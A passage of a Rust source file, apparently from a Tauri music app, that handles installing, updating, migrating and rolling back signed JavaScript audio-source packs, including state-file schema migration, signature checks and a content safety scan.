//! 统一音源包模型 v3（与 qt-uniappx `services/source-bundle-fs.uts` /
//! `source-update.uts` 同口径）：
//!
//! - 每个包 = 单文件 js，首行 `/*__QT_PACK__{kind,id,name,versionCode,…}*/
//!   自描述包头（[`crate::source_pack_header`]）；meta（数据包）与 play
//!   （播放包）走**同一条**安装/更新/启停/卸载管线，只有槽位不同；
//! - `state.json` schema 3：packs[]（多包共存）+ activeId（播放槽，None =
//!   未装）+ activeMetaId（数据槽，None = 未装数据包——数据面下线，前端
//!   首页全屏引导安装）+ lastCheckAt；
//! - 安装：`install/<id>/{meta,play}-bundle.js` 落盘（旧产物备份 `.prev`）；
//!   同 id 原位更新；播放包安装顺手清掉残留 chain.json；
//! - 生效门：只有「槽位空着或本来就生效的是它」才自动上位，不抢用户选择；
//! - 更新发现（`source_discover_updates`）双通道合一：① 每个包自身
//!   updateUrl 的 Range 探测（4h 节流）② astral manifest（发布/平台/宿主
//!   契约门槛）。两种包均**仅对已装包提示更新**——未装不主动下发首装
//!   offer（客户端口径：音源包自行安装，不宣传官方渠道）。同 id 多通道
//!   取最高 versionCode。**发现只提示不自动装**（前端逐条确认）；
//! - `source_apply_update`：下载 → 包头必须与 offer 的 id/kind/versionCode
//!   完全一致 → 按更新安装（isUpdate）。更新失败（引擎装载/冒烟炸了）由
//!   `source_pack_load_failed` / `source_meta_load_failed` 自动回滚 `.prev`
//!   并拉黑该版本；手动安装失败保留现场等用户处理。
//!
//! 包列表/播放槽变化广播 `source-pack-changed`（引擎页热切换播放包）；
//! 数据槽变化广播 `source-meta-changed`（引擎页重装 meta 槽并复验契约）。
//! 均不重启应用、不重建引擎窗口。
//!
//! 迁移：v2（双包架构）→ v3：official → play-official（目录改名到 id）、
//! 全部旧包归为 play、bad[] → play-official 的 skipCodes、
//! previousOfficial 快照弃用；v1 → v3：不兼容的 ESM 全量包连 install/ 一起清掉。

use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::{Mutex, OnceLock};

use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use tauri::{AppHandle, Emitter, Manager};

use crate::astral;
use crate::commands::{source_builtin_request, SourceRequestOptions};
use crate::source_pack_header::{
    parse_pack_header, valid_pack_id, PackHeader, PACK_KIND_META, PACK_KIND_PLAY,
    PLAY_PACK_FACTORY_MARKER,
};
use crate::{source_bundle, AppState};

// 宿主契约版本取 app_config（app.config.json 单一来源生成）；本文件旧版本曾
// 重复手写字面量，会随 sync 漂移 —— 2026-10-08 审计修复，改引用不复制。
use crate::app_config::HOST_API_VERSION;

/// 状态结构版本（v3 统一包模型）
const STATE_SCHEMA: i64 = 3;

pub use crate::source_pack_header::{OFFICIAL_META_ID, OFFICIAL_PLAY_ID};

/// 数据包产物文件名（引擎页按 `<dir>/meta-bundle.js` 取装载）
const ARTIFACT_META: &str = "meta-bundle.js";
/// 播放包产物文件名（引擎页按 `<dir>/play-bundle.js` 取装载）
const ARTIFACT_PLAY: &str = "play-bundle.js";
/// 更新前的旧产物备份后缀（回滚 = 复制回去）
const PREV_SUFFIX: &str = ".prev";

/// 安装来源渠道（install_source 取值；与 uniappx 同口径）
const INSTALL_SOURCE_URL: &str = "url";
const INSTALL_SOURCE_FILE: &str = "file";
const INSTALL_SOURCE_MANIFEST: &str = "manifest";
/// last_error 存储截断上限（列表展示再截 40 字，这里只防 state.json 被撑爆）
const MAX_ERROR_CHARS: usize = 300;

/// 包下载超时（60s，与 uniappx DOWNLOAD_TIMEOUT_MS 一致）
const DOWNLOAD_TIMEOUT_MS: u64 = 60_000;
/// 包头探测超时（10s，与 uniappx PROBE_TIMEOUT_MS 一致）
const PROBE_TIMEOUT_MS: u64 = 10_000;
/// 包头探测的 Range 长度（首 4KiB 足够覆盖包头）
const PROBE_RANGE_BYTES: usize = 4096;
/// 同一包两次 updateUrl 探测的最小间隔（4h，与 uniappx PROBE_INTERVAL_MS 一致）
const PROBE_INTERVAL_SECS: i64 = 4 * 60 * 60;
/// 包体防呆下限（正常 bundle ≥ 100KB；挡重定向到 HTML 错误页之类）
const MIN_PACK_BYTES: usize = 1024;

/// 已安装的音源包（v3 状态条目；meta 与 play 同构）
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase")]
pub struct SourcePackMeta {
    /// 包 id（来自包头，`^[a-z0-9-]{2,32}$`；同时是 install/ 下的目录名）
    pub id: String,
    /// `meta`（数据包）或 `play`（播放包）
    pub kind: String,
    /// 展示名（包头自带；空则 UI 兜底「数据包/播放包」）
    pub name: String,
    /// 版本号（包头 versionCode；更新判定唯一依据）
    pub version_code: i64,
    /// 版本展示名（包头 versionName）
    pub version_name: String,
    /// 自更新探测直链（包头 updateUrl；空 = 不参与自探测通道）
    pub update_url: String,
    /// install/ 下的目录名（= id，保留字段以兼容手工整理）
    pub dir: String,
    /// 安装时间（unix 秒）
    pub installed_at: i64,
    /// 最后变更时间（unix 秒；同槽排序用）
    pub updated_at: i64,
    /// 本包拉黑过的 versionCode（装载/冒烟失败过，不再自动更新到该版本）
    pub skip_codes: Vec<i64>,
    /// 上次 updateUrl 探测时间（unix 秒；4h 节流）
    pub last_probe_at: i64,
    /// 安装来源："" 未知 / "url" https 直链 / "file" 本地文件 /
    /// "manifest" 官方通道更新（旧 state.json 缺省 = ""）
    pub install_source: String,
    /// 安装来源展示（直链 URL 或本地文件名；官方通道更新后清空）
    pub install_ref: String,
    /// 最近一次装载/冒烟/更新失败摘要（空 = 无；成功生效时清除）
    pub last_error: String,
    /// 最近一次失败时间（unix 毫秒，与 uniappx Date.now() 同口径；0 = 无）
    pub last_error_at: i64,
    /// 官方 id 包安装时 ed25519 签名校验通过。签名落地前安装的历史官方包
    /// 为 false——manifest 通道对这类包不按 versionCode 压制（见
    /// check_source_updates），让真官方更新总能提示出来，覆盖掉历史冒充包。
    /// 第三方包恒 false（不参与判定）。
    pub sign_verified: bool,
}

impl SourcePackMeta {
    fn artifact(&self) -> &'static str {
        artifact_of(&self.kind)
    }
}

fn artifact_of(kind: &str) -> &'static str {
    if kind == PACK_KIND_META {
        ARTIFACT_META
    } else {
        ARTIFACT_PLAY
    }
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase")]
pub struct SourceBundleState {
    /// 状态结构版本（当前 = 3）
    pub schema: i64,
    /// 已安装音源包（多包共存；meta 在前）
    pub packs: Vec<SourcePackMeta>,
    /// 播放槽：生效播放包 id（None = 未装任何播放包，取链按「未安装」口径）
    pub active_id: Option<String>,
    /// 数据槽：生效数据包 id（None = 未装数据包，数据面下线）
    pub active_meta_id: Option<String>,
    pub last_check_at: i64,
}

impl SourceBundleState {
    fn new_v3() -> Self {
        Self {
            schema: STATE_SCHEMA,
            ..Default::default()
        }
    }

    fn pack(&self, id: &str) -> Option<&SourcePackMeta> {
        self.packs.iter().find(|p| p.id == id)
    }

    fn active_meta_pack(&self) -> Option<&SourcePackMeta> {
        self.active_meta_id.as_deref().and_then(|id| self.pack(id))
    }
}

// ---------- v2 / v1 结构（仅迁移用） ----------

/// v2 播放包条目（双包架构：official=manifest 自动更新 / custom=直链手动）
#[derive(Debug, Clone, Default, Deserialize)]
#[serde(default, rename_all = "camelCase")]
struct PlayPackMetaV2 {
    id: String,
    name: String,
    #[allow(dead_code)]
    version: String,
    version_code: i64,
    version_name: String,
    source: String,
    dir: String,
    installed_at: i64,
}

#[derive(Debug, Clone, Default, Deserialize)]
#[serde(default, rename_all = "camelCase")]
struct SourceBundleStateV2 {
    packs: Vec<PlayPackMetaV2>,
    active_id: Option<String>,
    bad: Vec<i64>,
    last_check_at: i64,
}

#[derive(Debug, Clone, Default, Deserialize)]
#[serde(default, rename_all = "camelCase")]
struct SourceBundleStateV1 {
    #[allow(dead_code)]
    installed: Option<serde_json::Value>,
    #[allow(dead_code)]
    previous: Option<serde_json::Value>,
    bad: Vec<i64>,
    last_check_at: i64,
}

// ---------- state.json 读写 ----------

pub(crate) fn state_path(dir: &Path) -> PathBuf {
    dir.join("state.json")
}

/// 读状态（含 v1/v2 → v3 迁移 + 落盘校验：产物缺失的包直接剔除）
pub(crate) fn load_state(dir: &Path) -> SourceBundleState {
    let text = std::fs::read_to_string(state_path(dir)).unwrap_or_default();
    let raw = match serde_json::from_str::<Value>(&text) {
        Ok(v) => v,
        Err(_) => {
            // 损坏/缺省：按空 v3 处理（install/ 残留由 prune_orphans 收尾）
            return SourceBundleState::new_v3();
        }
    };
    let mut state = match raw.get("schema").and_then(|v| v.as_i64()) {
        Some(3) => serde_json::from_value(raw).unwrap_or_else(|_| SourceBundleState::new_v3()),
        Some(2) => migrate_v2(dir, raw),
        _ => migrate_v1(dir, raw),
    };
    validate_on_disk(dir, &mut state);
    state
}

pub(crate) fn save_state(dir: &Path, state: &SourceBundleState) -> Result<(), String> {
    std::fs::create_dir_all(dir).map_err(|e| e.to_string())?;
    let text = serde_json::to_string_pretty(state).map_err(|e| e.to_string())?;
    std::fs::write(state_path(dir), text).map_err(|e| e.to_string())
}

/// v2 → v3：全部旧包归为 play；official → play-official（目录改名到 id）；
/// bad[] → play-official 的 skipCodes；previousOfficial 弃用（其目录在 v2
/// 安装新版时已被删除，无从恢复）；custom 包保持 id/目录。
fn migrate_v2(dir: &Path, raw: Value) -> SourceBundleState {
    let v2: SourceBundleStateV2 = serde_json::from_value(raw).unwrap_or_default();
    let mut state = SourceBundleState::new_v3();
    state.last_check_at = v2.last_check_at;
    let install = dir.join("install");
    for pack in v2.packs {
        let id = if pack.id == "official" {
            OFFICIAL_PLAY_ID.to_string()
        } else {
            pack.id
        };
        if !valid_pack_id(&id) || state.pack(&id).is_some() {
            continue;
        }
        // 目录统一改名到 id（v3 布局 install/<id>/<artifact>）
        if pack.dir != id {
            let from = install.join(&pack.dir);
            let to = install.join(&id);
            if from.is_dir() {
                let _ = std::fs::remove_dir_all(&to);
                if std::fs::rename(&from, &to).is_err() {
                    let _ = copy_dir(&from, &to);
                    let _ = std::fs::remove_dir_all(&from);
                }
            }
        }
        let skip_codes = if id == OFFICIAL_PLAY_ID {
            v2.bad.clone()
        } else {
            Vec::new()
        };
        state.packs.push(SourcePackMeta {
            name: if pack.name.trim().is_empty() {
                if pack.source == "official" {
                    "官方播放包".into()
                } else {
                    "自定义播放包".into()
                }
            } else {
                pack.name
            },
            version_name: if pack.version_name.trim().is_empty() {
                format!("code {}", pack.version_code)
            } else {
                pack.version_name
            },
            id: id.clone(),
            kind: PACK_KIND_PLAY.to_string(),
            version_code: pack.version_code,
            update_url: String::new(),
            dir: id,
            installed_at: pack.installed_at,
            updated_at: pack.installed_at,
            skip_codes,
            last_probe_at: 0,
            // v2 official 走 manifest 自动更新通道；custom 当时经直链/本地安装
            install_source: if pack.source == "official" {
                INSTALL_SOURCE_MANIFEST.to_string()
            } else {
                String::new()
            },
            install_ref: String::new(),
            last_error: String::new(),
            last_error_at: 0,
            // v2 时代的官方包没有签名（签名 2026-10 才落地）——按未验签迁移，
            // manifest 通道对它不按 versionCode 压制，新版真官方包会覆盖上来
            sign_verified: false,
        });
    }
    state.active_id = v2
        .active_id
        .map(|a| {
            if a == "official" {
                OFFICIAL_PLAY_ID.to_string()
            } else {
                a
            }
        })
        .filter(|a| state.pack(a).is_some());
    if let Err(e) = save_state(dir, &state) {
        log::warn!("[source-bundle] v2→v3 迁移落盘失败: {e}");
    }
    log::info!("[source-bundle] v2→v3 迁移完成：{} 个包", state.packs.len());
    state
}

/// v1（单体 ESM 全量包）→ v3：格式不兼容，连 install/ 一起清掉，只保留
/// lastCheckAt（v1 的 bad[] 针对早已不可装载的 ESM 包，一并作废）。
fn migrate_v1(dir: &Path, raw: Value) -> SourceBundleState {
    let v1: SourceBundleStateV1 = serde_json::from_value(raw).unwrap_or_default();
    let mut state = SourceBundleState::new_v3();
    state.last_check_at = v1.last_check_at;
    let install = dir.join("install");
    if install.exists() {
        let _ = std::fs::remove_dir_all(&install);
        log::info!(
            "[source-bundle] v1→v3 迁移：清空不兼容的旧音源包目录 {}",
            install.display()
        );
    }
    state
}

fn copy_dir(from: &Path, to: &Path) -> std::io::Result<()> {
    std::fs::create_dir_all(to)?;
    for entry in std::fs::read_dir(from)? {
        let entry = entry?;
        let target = to.join(entry.file_name());
        if entry.file_type()?.is_dir() {
            copy_dir(&entry.path(), &target)?;
        } else {
            std::fs::copy(entry.path(), target)?;
        }
    }
    Ok(())
}

impl SourceBundleState {
    /// putPack：同 id 原位替换（保留 installedAt/skipCodes/lastProbeAt），
    /// 否则插入；然后排序（meta 在前、updatedAt 降序）。
    fn pack_mut_or_push(&mut self, pack: SourcePackMeta) {
        if let Some(old) = self.packs.iter_mut().find(|p| p.id == pack.id) {
            *old = pack;
        } else {
            self.packs.push(pack);
        }
        self.sort_packs();
    }

    fn sort_packs(&mut self) {
        self.packs.sort_by(|a, b| {
            let kind = |p: &SourcePackMeta| if p.kind == PACK_KIND_META { 0 } else { 1 };
            kind(a)
                .cmp(&kind(b))
                .then(b.updated_at.cmp(&a.updated_at))
                .then(b.installed_at.cmp(&a.installed_at))
        });
    }
}

/// 落盘校验：主产物不在了的包剔除（active 指向被剔除包时清空该槽）。
/// 引擎窗口加载不到的包留在列表里只会让设置页展示幽灵条目。
fn validate_on_disk(dir: &Path, state: &mut SourceBundleState) {
    let install = dir.join("install");
    let mut lost: Vec<String> = Vec::new();
    state.packs.retain(|p| {
        let ok = install.join(&p.dir).join(p.artifact()).is_file();
        if !ok {
            lost.push(p.id.clone());
        }
        ok
    });
    if let Some(active) = &state.active_id {
        if lost.contains(active) {
            state.active_id = None;
        }
    }
    if let Some(active) = &state.active_meta_id {
        if lost.contains(active) {
            state.active_meta_id = None;
        }
    }
    if !lost.is_empty() {
        log::warn!("[source-bundle] 状态校验：剔除产物缺失的包 {lost:?}");
    }
}

/// 清掉 install/ 下不在包列表里的孤儿目录（卸载残留/半截安装）
fn prune_orphans(dir: &Path, state: &SourceBundleState) {
    let install = dir.join("install");
    let Ok(entries) = std::fs::read_dir(&install) else {
        return;
    };
    for entry in entries.flatten() {
        if !entry.file_type().map(|t| t.is_dir()).unwrap_or(false) {
            continue;
        }
        let name = entry.file_name().to_string_lossy().to_string();
        if !state.packs.iter().any(|p| p.dir == name) {
            let _ = std::fs::remove_dir_all(entry.path());
            log::info!("[source-bundle] 清理孤儿包目录: {name}");
        }
    }
}

fn unix_now() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0)
}

/// last_error_at 的时间口径：unix 毫秒（与 uniappx Date.now() 一致，
/// 不同于 installedAt/updatedAt 的秒）
fn unix_now_millis() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis() as i64)
        .unwrap_or(0)
}

fn truncate_chars(s: &str, max: usize) -> String {
    if s.chars().count() <= max {
        s.to_string()
    } else {
        s.chars().take(max).collect()
    }
}

/// 记录包最近一次失败（装载/冒烟/更新失败），供设置页列表观测
/// 「上次失败：…」。包记录不存在（如首装型更新失败已被整体摘除）时静默跳过。
fn note_pack_error_at(dir: &Path, pack_id: &str, error: &str) {
    let error = truncate_chars(error.trim(), MAX_ERROR_CHARS);
    if error.is_empty() {
        return;
    }
    let mut state = load_state(dir);
    let Some(p) = state.packs.iter_mut().find(|p| p.id == pack_id) else {
        return;
    };
    if p.last_error == error && p.last_error_at > 0 {
        return; // 同一条失败不重复刷时间
    }
    p.last_error = error;
    p.last_error_at = unix_now_millis();
    let _ = save_state(dir, &state);
}

/// 清除包的失败记录（引擎装载/冒烟通过、成功生效时调用）
fn clear_pack_error_at(dir: &Path, pack_id: &str) {
    let mut state = load_state(dir);
    let Some(p) = state.packs.iter_mut().find(|p| p.id == pack_id) else {
        return;
    };
    if p.last_error.is_empty() && p.last_error_at == 0 {
        return;
    }
    p.last_error = String::new();
    p.last_error_at = 0;
    let _ = save_state(dir, &state);
}

fn install_dir(dir: &Path, id: &str) -> PathBuf {
    dir.join("install").join(id)
}

// ---------- 待生效的更新上下文（更新失败自动回滚用） ----------

/// 一次「按更新安装」的现场：旧包记录 + 安装前的两个槽位。
/// 引擎装载/冒烟成功（describe/meta_loaded）→ 清除；失败（load_failed）→ 回滚。
#[derive(Debug, Clone)]
struct PendingApply {
    kind: String,
    is_update: bool,
    prev_pack: Option<SourcePackMeta>,
    prev_active: Option<String>,
    prev_active_meta: Option<String>,
}

static PENDING_APPLIES: OnceLock<Mutex<HashMap<String, PendingApply>>> = OnceLock::new();

fn pending_map() -> &'static Mutex<HashMap<String, PendingApply>> {
    PENDING_APPLIES.get_or_init(|| Mutex::new(HashMap::new()))
}

fn put_pending(pack_id: &str, pending: PendingApply) {
    pending_map()
        .lock()
        .unwrap_or_else(|e| e.into_inner())
        .insert(pack_id.to_string(), pending);
}

fn take_pending(pack_id: &str) -> Option<PendingApply> {
    pending_map()
        .lock()
        .unwrap_or_else(|e| e.into_inner())
        .remove(pack_id)
}

fn clear_pending(pack_id: &str) {
    pending_map()
        .lock()
        .unwrap_or_else(|e| e.into_inner())
        .remove(pack_id);
}

// ---------- 统一安装管线 ----------

/// 安装结果（命令层据此广播 + 前端据此提示）
#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct InstallOutcome {
    pub kind: String,
    /// 本次是否已上位到对应槽位（引擎将热装载/重装 meta 槽）
    pub activated: bool,
    /// 同 id 原位更新（旧版本存在，已备份 .prev）
    pub replaced: bool,
    pub pack: SourcePackMeta,
}

/// 包文本静态校验（包头 / 体积下限 / 播放包装配入口 / 跨 kind id 冲突 /
/// 官方 id 签名硬校验）。
/// 安装管线与安装预览（staged）共用：预览能过的包，安装阶段基本不会再
/// 栽在这些静态门槛上。
fn validate_pack_text(dir: &Path, text: &str) -> Result<PackHeader, String> {
    let header = parse_pack_header(text)
        .ok_or_else(|| "不是可安装的音源包（首行缺少 __QT_PACK__ 包头）".to_string())?;
    if text.len() < MIN_PACK_BYTES {
        return Err("包内容太小，不是有效的音源包".to_string());
    }
    if header.kind == PACK_KIND_PLAY && !text.contains(PLAY_PACK_FACTORY_MARKER) {
        return Err("不是可安装的播放音源包（缺少 __qtPlayPackFactory 装配入口）".to_string());
    }
    // 官方 id 签名硬校验：官方包同样走直链/本地分发，身份靠签名而非渠道——
    // 验不过（含无签名块）一律拒绝，冒充/篡改的包进不了官方槽；第三方 id 不受影响。
    // 对所有渠道生效（直链/本地/manifest/自管更新），是安装管线的最终闸门。
    let is_official = header.id == OFFICIAL_META_ID || header.id == OFFICIAL_PLAY_ID;
    if is_official {
        #[cfg(test)]
        if tests::BYPASS_SIGNATURE_GATE.load(std::sync::atomic::Ordering::SeqCst) > 0 {
            // 测试旁路：模拟签名落地前的历史安装路径（仅测试二进制存在，见 tests 模块）
        } else {
            crate::pack_signature::verify_official_signature(text)
                .map_err(|e| format!("官方包签名校验失败：{e}"))?;
        }
        #[cfg(not(test))]
        crate::pack_signature::verify_official_signature(text)
            .map_err(|e| format!("官方包签名校验失败：{e}"))?;
    }
    // 内容安全扫描（扫描对象 = 剥掉签名块的正文）：签名只证明来源，不证明内容
    // 无害——第三方包任何命中即拒；官方包已验签（来源可信），命中只记日志。
    // 规则与 qt-uniappx services/pack-safety.uts 逐条一致。
    let body_for_scan = crate::pack_signature::split_sign_block(text).0;
    crate::pack_safety::scan_pack_text(body_for_scan, is_official)?;
    if let Some(old) = load_state(dir).pack(&header.id) {
        if old.kind != header.kind {
            return Err(format!(
                "包 id 冲突：{} 已被{}音源包占用，请先卸载",
                header.id,
                if old.kind == PACK_KIND_META {
                    "数据"
                } else {
                    "播放"
                }
            ));
        }
    }
    Ok(header)
}

/// 统一安装管线（installFromUrl / installFromLocalFile / installFromText /
/// applyUpdate / installStaged 共用）。`is_update = true` 时装载失败自动回滚
/// `.prev`。`channel`/`reference` 记录安装来源（观测用，见 SourcePackMeta）：
/// - 首装 / 手动重装：按实际渠道写（url+URL / file+文件名 / ""=来源不明）；
/// - 更新 + 官方 manifest 通道：改写为 manifest + 空 ref；
/// - 更新 + 自管通道（包自身 updateUrl）：保留原安装来源；
///   无旧记录（首装 offer 走 apply，如 play 未装首装）→ manifest。
///
/// 步骤：解析包头 → 播放包标记校验 → id 冲突校验 → 旧产物备份 `.prev` →
/// 落盘 → putPack → 播放包清残留 chain.json → prune → 生效门 → 落盘状态。
fn install_pack_at(
    dir: &Path,
    text: &str,
    is_update: bool,
    channel: &str,
    reference: &str,
) -> Result<InstallOutcome, String> {
    let header = validate_pack_text(dir, text)?;
    let artifact = artifact_of(&header.kind);
    let mut state = load_state(dir);
    let prev_active = state.active_id.clone();
    let prev_active_meta = state.active_meta_id.clone();
    let old_pack = state.pack(&header.id).cloned();

    let target = install_dir(dir, &header.id);
    std::fs::create_dir_all(&target).map_err(|e| e.to_string())?;
    let main = target.join(artifact);
    let prev_file = target.join(format!("{artifact}{PREV_SUFFIX}"));
    let mut backup_created = false;
    if main.is_file() {
        std::fs::copy(&main, &prev_file).map_err(|e| e.to_string())?;
        backup_created = true;
    }
    let write_result = (|| -> Result<(), String> {
        std::fs::write(&main, text).map_err(|e| e.to_string())?;
        if header.kind == PACK_KIND_PLAY {
            // 播放包自包含默认 chain；残留的 chain.json 属于旧版本，清掉
            let _ = std::fs::remove_file(target.join("chain.json"));
        }
        let now = unix_now();
        // 安装来源映射（语义见 install_pack_at 文档注释）
        let (install_source, install_ref) = if channel == INSTALL_SOURCE_MANIFEST {
            (INSTALL_SOURCE_MANIFEST.to_string(), String::new())
        } else if is_update {
            match old_pack.as_ref() {
                Some(old) => (old.install_source.clone(), old.install_ref.clone()),
                // 自管更新但无旧记录（首装 offer 走 apply）= 官方渠道本体
                None => (INSTALL_SOURCE_MANIFEST.to_string(), String::new()),
            }
        } else {
            (channel.to_string(), reference.trim().to_string())
        };
        let pack = SourcePackMeta {
            id: header.id.clone(),
            kind: header.kind.clone(),
            name: if header.name.trim().is_empty() {
                if header.kind == PACK_KIND_META {
                    "数据包".into()
                } else {
                    "播放包".into()
                }
            } else {
                header.name.clone()
            },
            version_code: header.version_code,
            version_name: if header.version_name.trim().is_empty() {
                format!("code {}", header.version_code)
            } else {
                header.version_name.clone()
            },
            update_url: header.update_url.trim().to_string(),
            dir: header.id.clone(),
            installed_at: old_pack.as_ref().map(|p| p.installed_at).unwrap_or(now),
            updated_at: now,
            skip_codes: old_pack
                .as_ref()
                .map(|p| p.skip_codes.clone())
                .unwrap_or_default(),
            last_probe_at: old_pack.as_ref().map(|p| p.last_probe_at).unwrap_or(0),
            install_source,
            install_ref,
            last_error: String::new(),
            last_error_at: 0,
            // 走到这里 = validate_pack_text 已过（官方 id 必已验签）
            sign_verified: header.id == OFFICIAL_META_ID || header.id == OFFICIAL_PLAY_ID,
        };
        state.pack_mut_or_push(pack.clone());
        // 生效门：槽位空着或本来就生效的是它 → 自动上位；否则不打扰用户选择
        if header.kind == PACK_KIND_PLAY {
            if state.active_id.as_deref().map_or(true, |a| a == header.id) {
                state.active_id = Some(header.id.clone());
            }
        } else if state
            .active_meta_id
            .as_deref()
            .map_or(true, |a| a == header.id)
        {
            state.active_meta_id = Some(header.id.clone());
        }
        prune_orphans(dir, &state);
        save_state(dir, &state)?;
        put_pending(
            &header.id,
            PendingApply {
                kind: header.kind.clone(),
                is_update,
                prev_pack: old_pack.clone(),
                prev_active,
                prev_active_meta,
            },
        );
        Ok(())
    })();
    if let Err(e) = write_result {
        // 半截安装：把 .prev 还原回去，尽量不留脏现场
        if backup_created && prev_file.is_file() {
            let _ = std::fs::copy(&prev_file, &main);
            let _ = std::fs::remove_file(&prev_file);
        }
        let _ = take_pending(&header.id);
        // 原记录还在（下载成功但落盘/存状态失败）：记一笔失败便于列表观测
        if old_pack.is_some() {
            note_pack_error_at(dir, &header.id, &e);
        }
        return Err(e);
    }

    let pack = state.pack(&header.id).cloned().ok_or("安装后包记录缺失")?;
    Ok(InstallOutcome {
        activated: write_result_is_activated(&state, &header.id),
        replaced: old_pack.is_some(),
        kind: header.kind.clone(),
        pack,
    })
}

fn write_result_is_activated(state: &SourceBundleState, id: &str) -> bool {
    state.active_id.as_deref() == Some(id) || state.active_meta_id.as_deref() == Some(id)
}

/// 回滚一次更新（引擎装载/冒烟失败时由 load_failed 调用）：
/// 有旧包 → 还原 .prev + 恢复记录 + 拉黑新版本；无旧包（首装型更新）→ 整体摘除。
/// 返回 (是否回退到旧版, 是否拉黑了新版本号)。
fn rollback_update_at(dir: &Path, pack_id: &str) -> (bool, bool) {
    let Some(pending) = take_pending(pack_id) else {
        return (false, false);
    };
    let mut state = load_state(dir);
    let target = install_dir(dir, pack_id);
    let artifact = artifact_of(&pending.kind);
    let bad_code = state.pack(pack_id).map(|p| p.version_code).unwrap_or(0);
    if let Some(prev) = pending.prev_pack.clone() {
        let prev_file = target.join(format!("{artifact}{PREV_SUFFIX}"));
        if prev_file.is_file() {
            let _ = std::fs::copy(&prev_file, target.join(artifact));
            let _ = std::fs::remove_file(&prev_file);
        }
        let mut restored = prev;
        if bad_code > 0 && !restored.skip_codes.contains(&bad_code) {
            restored.skip_codes.push(bad_code);
        }
        state.pack_mut_or_push(restored);
    } else {
        state.packs.retain(|p| p.id != pack_id);
        let _ = std::fs::remove_dir_all(&target);
    }
    if pending.kind == PACK_KIND_META {
        state.active_meta_id = pending.prev_active_meta.filter(|a| {
            // 旧记录没回到列表里就不能指
            state.active_meta_pack().is_some() || a != pack_id
        });
        if state.active_meta_id.as_deref() == Some(pack_id) && state.pack(pack_id).is_none() {
            state.active_meta_id = None;
        }
    } else {
        state.active_id = pending
            .prev_active
            .filter(|a| a != pack_id || state.pack(pack_id).is_some());
        if state.active_id.as_deref() == Some(pack_id) && state.pack(pack_id).is_none() {
            state.active_id = None;
        }
    }
    let _ = save_state(dir, &state);
    (
        pending.prev_pack.is_some(),
        bad_code > 0 && pending.prev_pack.is_some(),
    )
}

fn broadcast_packs_changed(app: &AppHandle) {
    let _ = app.emit("source-pack-changed", ());
}

// ---------- 安装预览现场（URL/本地文件先预览确认，再落盘） ----------

/// 一份「待确认」的安装现场：全文已下载/读入，用户在预览弹窗确认
/// （source_install_staged）后才真正安装；官方 id 冒充警示在这一层做。
#[derive(Debug, Clone)]
struct StagedInstall {
    /// 渠道（url / file；进 install_pack_at 的 channel 参数）
    channel: String,
    /// 来源展示（URL / 文件名；进 install_pack_at 的 reference 参数）
    reference: String,
    text: String,
}

/// token → 暂存全文。只保留最近 8 份（HashMap 无序，近似淘汰最旧即可，
/// 目的只是防止反复预览累积内存；预览过期/重复安装都会自然失败提示重试）。
static STAGED_INSTALLS: OnceLock<Mutex<HashMap<String, StagedInstall>>> = OnceLock::new();

fn staged_map() -> &'static Mutex<HashMap<String, StagedInstall>> {
    STAGED_INSTALLS.get_or_init(|| Mutex::new(HashMap::new()))
}

fn put_staged(staged: StagedInstall) -> String {
    let token = format!("{}-{:x}", unix_now_millis(), fastrand::u64(..));
    let mut map = staged_map().lock().unwrap_or_else(|e| e.into_inner());
    while map.len() >= 8 {
        if let Some(victim) = map.keys().next().cloned() {
            map.remove(&victim);
        }
    }
    map.insert(token.clone(), staged);
    token
}

fn take_staged(token: &str) -> Option<StagedInstall> {
    staged_map()
        .lock()
        .unwrap_or_else(|e| e.into_inner())
        .remove(token)
}

/// 安装预览信息（source_stage_from_url / source_stage_from_file 返回，
/// 前端据此渲染确认弹窗：类型/名称/版本/id/来源 + 官方签名校验结果）
#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct PackPreview {
    pub token: String,
    pub kind: String,
    pub id: String,
    pub name: String,
    pub version_code: i64,
    pub version_name: String,
    /// url / file（前端展示「来源」时区分直链/本地文件）
    pub channel: String,
    /// 来源展示（完整 URL 或文件名）
    pub reference: String,
    /// 官方包（play-official / meta-official）ed25519 签名校验通过。
    /// 走到预览的官方包必为 true（validate_pack_text 已挡掉未验签的冒充包，
    /// 预览报错不进弹窗）；前端显示「官方 · 已验签」徽标。第三方包恒 false。
    signature_verified: bool,
    /// 已安装同 id 包的版本（0 = 未装过；>0 前端提示将原位替换）
    installed_code: i64,
}

/// 预览暂存 + 组装预览信息（静态校验放前面：预览能过的包基本能装上；
/// 官方 id 的签名硬校验也在 validate_pack_text 里，冒充包在这一步就报错）
fn stage_pack_text(
    app: &AppHandle,
    text: &str,
    channel: &str,
    reference: &str,
) -> Result<PackPreview, String> {
    let dir = source_bundle::bundle_dir(app);
    let header = validate_pack_text(&dir, text)?;
    let signature_verified = header.id == OFFICIAL_META_ID || header.id == OFFICIAL_PLAY_ID;
    let installed_code = load_state(&dir)
        .pack(&header.id)
        .map(|p| p.version_code)
        .unwrap_or(0);
    let token = put_staged(StagedInstall {
        channel: channel.to_string(),
        reference: reference.to_string(),
        text: text.to_string(),
    });
    Ok(PackPreview {
        token,
        kind: header.kind,
        id: header.id,
        name: header.name.trim().to_string(),
        version_code: header.version_code,
        version_name: header.version_name.trim().to_string(),
        channel: channel.to_string(),
        reference: reference.to_string(),
        signature_verified,
        installed_code,
    })
}

fn broadcast_meta_changed(app: &AppHandle) {
    let _ = app.emit("source-meta-changed", ());
}

fn broadcast_if_activated(app: &AppHandle, outcome: &InstallOutcome) {
    if !outcome.activated {
        return;
    }
    if outcome.kind == PACK_KIND_META {
        broadcast_meta_changed(app);
    } else {
        broadcast_packs_changed(app);
    }
}

// ---------- manifest 解析（astral 通道；QtRestResp 包装响应） ----------

/// 后端 VO 全是包装类型，可空列会序列化成 null；一个 null 不该让整个 manifest 解析失败。
fn null_as_default<'de, D, T>(deserializer: D) -> Result<T, D::Error>
where
    D: serde::Deserializer<'de>,
